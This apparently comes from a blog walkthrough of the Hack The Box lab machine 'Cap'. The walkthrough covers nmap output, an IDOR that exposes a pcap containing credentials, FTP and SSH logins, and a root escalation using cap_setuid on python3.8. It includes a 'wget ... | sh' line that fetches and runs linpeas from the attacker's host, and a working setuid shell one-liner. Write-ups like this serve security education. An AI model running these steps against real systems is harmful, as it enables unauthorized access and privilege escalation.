</span></span></span><span class="line"><span class="cl"><span class="s2">SF:TTPOptions,B3,&#34;</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20200<span class="se">\x</span>20OK<span class="se">\r\n</span>Server:<span class="se">\x</span>20gunicorn<span class="se">\r\n</span>Date:<span class="se">\x</span>
</span></span><span class="line"><span class="cl">SF:20Mon,<span class="se">\x</span>2004<span class="se">\x</span>20Nov<span class="se">\x</span>202024<span class="se">\x</span>2014:23:20<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:r<span class="se">\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>utf-8<span class="se">\r\n</span>Allow:<span class="se">\x</span>20OPTIONS,<span class="se">\x</span>
</span></span><span class="line"><span class="cl">SF:20GET,<span class="se">\x</span>20HEAD<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>200<span class="se">\r\n\r\n</span><span class="s2">&#34;)%r(RTSPRequest,121,&#34;</span>HTT
</span></span><span class="line"><span class="cl">SF:P/1<span class="se">\.</span>1<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n</span>Content-Type
</span></span><span class="line"><span class="cl">SF::<span class="se">\x</span>20text/html<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>20196<span class="se">\r\n\r\n</span>&lt;html&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;head&gt;<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:n<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;title&gt;Bad<span class="se">\x</span>20Request&lt;/title&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;/head&gt;<span class="se">\n\x</span>20<span class="se">\x</span>
</span></span><span class="line"><span class="cl">SF:20&lt;body&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;h1&gt;&lt;p&gt;Bad<span class="se">\x</span>20Request&lt;/p&gt;&lt;/h1&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x20Invalid<span class="se">\x</span>20HTTP<span class="se">\x</span>20Version<span class="se">\x</span>20<span class="p">&amp;</span><span class="c1">#x27;Invalid\x20HTTP\x20Version:\x20&amp;</span>
</span></span><span class="line"><span class="cl">SF:#x27<span class="p">;</span>RTSP/1<span class="se">\.</span>0<span class="p">&amp;</span><span class="c1">#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;)%r(FourOhFourRe</span>
</span></span><span class="line"><span class="cl">SF:quest,189,<span class="s2">&#34;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nD
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ate:\x20Mon,\x2004\x20Nov\x202024\x2014:23:27\x20GMT\r\nConnection:\x20
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
</span></span></span><span class="line"><span class="cl"><span class="s2">SF::\x20232\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x2
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:03\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20F
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ound&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20t
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:he\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20ple
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ase\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 145.37 seconds
</span></span></code></pre></div><p>We can see that machine has port 21,22 and 80 (3 TCP) ports are open.</p>
<p><strong>Let’s add Cap host to our /etc/hosts file:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;cap.htb     10.10.10.245&#34;</span> &gt; sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id="port-21-ftp">Port 21 FTP<a hidden class="anchor" aria-hidden="true" href="#port-21-ftp">#</a></h3>
<p>We tried to login into FTP as anonymous user since we don&rsquo;t have username and password for any of the services.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp 10.10.10.245
</span></span><span class="line"><span class="cl">Connected to 10.10.10.245.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.10.245:pixel<span class="o">)</span>: anonymous
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl"><span class="m">530</span> Login incorrect.
</span></span><span class="line"><span class="cl">ftp: Login failed
</span></span></code></pre></div><h3 id="port-22-ssh">Port 22 SSH<a hidden class="anchor" aria-hidden="true" href="#port-22-ssh">#</a></h3>
<p>We tried same thing for SSH. We login into ssh as anonymous but it&rsquo;s also an failed attempt.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh anonymous@10.10.10.245
</span></span><span class="line"><span class="cl">anonymous@10.10.10.245<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Permission denied, please try again.
</span></span></code></pre></div><h3 id="port-80-http">Port 80 HTTP<a hidden class="anchor" aria-hidden="true" href="#port-80-http">#</a></h3>
<p>It is running flask applicaiton that contains the Security Events, Faliled Login Attempts and Port Scan related detail.</p>
<p><img alt="Dashboard Preview" loading="lazy" src="/images/HTB/Cap/Dashboard.png"></p>
<p>Applicaiton also contains the Security Snapshots that belongs to user Nathan. We can see the refernece from the machine description that we have to find IDOR somewhere in the application.</p>
<p><img alt="Download the Snapshot" loading="lazy" src="/images/HTB/Cap/Download-Snapshot.png"></p>
<p>As we can see that, URL contains the numeric ID for the Security Snapshot. We can change the ID and try to see we can access other user&rsquo;s Security Snapshots or not!</p>
<p><img alt="IDOR" loading="lazy" src="/images/HTB/Cap/IDOR.png"></p>
<p>We changed the ID from 2 to 0 and as we can see result as Snapshot results are getting changed.</p>
<p>Download the pcap file and analzye it to see whether we can find anything interesting or not.</p>
<h3 id="wireshark">Wireshark<a hidden class="anchor" aria-hidden="true" href="#wireshark">#</a></h3>
<p><img alt="IDOR" loading="lazy" src="/images/HTB/Cap/Wireshark.png"></p>
<p>We can see that, pcap file contains the network logs. After further analysis we found that it contains the user name and password of the user nathan. We can use this credentials to login into FTP and SSH.</p>
<blockquote>
<p>We can use <strong>zeek</strong> tool to analyze the pcap file in easy way. Refers to <a href="https://youtube.com/watch?v=Ano11xS7Yy0">Analyzing PCAP with Zeek - HTB Sherlocks - KnockKnock</a> video by <strong>ippsec</strong> 🙌</p></blockquote>
<h2 id="getting-user-shell">Getting User shell<a hidden class="anchor" aria-hidden="true" href="#getting-user-shell">#</a></h2>
<p>We already got the user credentials from the pcap file analysis. Which we can use into FTP first to see it&rsquo;s valid credentials or not?</p>
<p><strong>Credentials:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Username: nathan
</span></span><span class="line"><span class="cl">Password: <span class="c1">###########</span>
</span></span></code></pre></div><h3 id="ftp-login">FTP Login<a hidden class="anchor" aria-hidden="true" href="#ftp-login">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp cap.htb
</span></span><span class="line"><span class="cl">Connected to cap.htb.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>cap.htb:pixel<span class="o">)</span>: nathan
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span></code></pre></div><p>Run <strong><code>dir</code></strong> command to list the files and folders</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; dir
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>13483<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-r--------    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">33</span> Nov <span class="m">04</span> 14:22 user.txt
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span></code></pre></div><p>Run the <strong><code>get</code></strong> command download the file and we can see we have our first <strong><code>user.txt</code></strong> flag with us..!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; get user.txt
</span></span></code></pre></div><p>We are able to login into FTP using nathan&rsquo;s credentials and we already have our first <strong><code>user.txt</code></strong> flag.</p>
<h2 id="getting-root-shell">Getting Root shell<a hidden class="anchor" aria-hidden="true" href="#getting-root-shell">#</a></h2>
<h3 id="ssh-login">SSH Login<a hidden class="anchor" aria-hidden="true" href="#ssh-login">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh nathan@cap.htb
</span></span></code></pre></div><p>Login into SSH to see we can find something innteresting in application code or any bash_history.</p>
<h4 id="reading-the-application-code">Reading the application code<a hidden class="anchor" aria-hidden="true" href="#reading-the-application-code">#</a></h4>
<p><img alt="Applicaiton-Code" loading="lazy" src="/images/HTB/Cap/Applicaiton-Code.png"></p>
<p>The Web applicaiton&rsquo;s code doesn&rsquo;t contain anything intersting. We can move forward to Linpease to find any other ways of exploitation.</p>
<h3 id="linpeasesh">Linpease.sh<a hidden class="anchor" aria-hidden="true" href="#linpeasesh">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget 10.10.15.20:8000/linpease.sh <span class="p">|</span> sh
</span></span></code></pre></div><p><strong>Interesting Output from linpease:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
</span></span><span class="line"><span class="cl">/usr/bin/ping <span class="o">=</span> cap_net_raw+ep
</span></span><span class="line"><span class="cl">/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
</span></span><span class="line"><span class="cl">/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep
</span></span></code></pre></div><p>Before, We jump into the explitation part we have to see what is cap_setuid and how it can be used for privilege escalation?</p>
<h3 id="what-is-capabilities-and-cap_setuid">What is Capabilities and cap_setuid?<a hidden class="anchor" aria-hidden="true" href="#what-is-capabilities-and-cap_setuid">#</a></h3>
<p>In Linux, capabilities are like permissions that let specific programs do things only the root (administrator) user usually can. Instead of giving full root access, capabilities let a program use just the parts of root access it needs. For example:</p>
<ul>
<li>CAP_NET_BIND_SERVICE: Allows a program to use network ports usually reserved for root.</li>
<li>CAP_SETUID: Lets a program change its user ID (UID), essentially letting it switch users.</li>
</ul>
<h3 id="how-can-cap_setuid-can-be-used-for-privilege-escalation">How can cap_setuid can be used for Privilege Escalation?<a hidden class="anchor" aria-hidden="true" href="#how-can-cap_setuid-can-be-used-for-privilege-escalation">#</a></h3>
<p>The cap_setuid capability is interesting because it lets a program switch its user ID to any user, including the root user.</p>
<h3 id="how-to-find-the-programs-with-cap_setuid">How to find the programs with cap_setuid?<a hidden class="anchor" aria-hidden="true" href="#how-to-find-the-programs-with-cap_setuid">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getcap -r / 2&gt;/dev/null <span class="p">|</span> grep cap_setuid
</span></span></code></pre></div><p><strong>Command Explanation:</strong></p>
<ol>
<li>&ldquo;getcap&rdquo; is the main command that finds and outputs the capabilities.</li>
<li>&ldquo;-r / &quot; means to search recursively in the root directory, which means in the whole file system.</li>
<li>&ldquo;2&gt;/dev/null&rdquo; does not output any errors which mostly caused by inaccessible directories.</li>
</ol>
<h3 id="get-the-root">Get the Root<a hidden class="anchor" aria-hidden="true" href="#get-the-root">#</a></h3>
<p>We already have get detailed information on how <code>cap_setuid</code> can be used for privilege escalation</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/python3.8 -c <span class="s1">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
</span></span></code></pre></div><p>Now, we have the root shell and we can read the flag..!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@cap:~# cat /root/root.txt
</span></span><span class="line"><span class="cl"><span class="c1">###############################</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Cap is an excellent machine for beginners as it teaches essential reconnaissance and basic privilege escalation techniques. The walkthrough covers every phase in detail, giving insights into each command used.</p>
<h2 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h2>
<ul>
<li>Thorough enumeration can reveal important information.</li>
<li>Pay attention to SUID binaries for privilege escalation.</li>
</ul>
<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=O_z6o2xuvlw">https://www.youtube.com/watch?v=O_z6o2xuvlw</a></li>
<li><a href="https://0xdf.gitlab.io/2021/10/02/htb-cap.html">https://0xdf.gitlab.io/2021/10/02/htb-cap.html</a></li>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></li>
</ul>
<h2 id="connect-with-me">Connect with Me<a hidden class="anchor" aria-hidden="true" href="#connect-with-me">#</a></h2>
<ul>
<li><a href="https://www.linkedin.com/in/bhavik-kanejiya">LinkedIn</a></li>
<li><a href="https://twitter.com/bhavik_kanejiya">Twitter</a></li>
<li><a href="https://github.com/bhavik-kanejiya">GitHub</a></li>
<li><a href="https://app.hackthebox.com/users/1998342">Hack The Box</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://bhavik-kanejiya.github.io/tags/walkthrough/">Walkthrough</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/htb/">HTB</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/linux/">Linux</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://bhavik-kanejiya.github.io/blog/kubernetes-security-basics-from-a-pentesters-point-of-view/">
    <span class="title">« Prev</span>
    <br>
    <span>Kubernetes Security Basics: From a Pentester’s Point of View</span>
  </a>
  <a class="next" href="https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/">
    <span class="title">Next »</span>
    <br>
    <span>HTB TwoMillion Walkthrough</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© 2025 Bhavik Kanejiya</span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
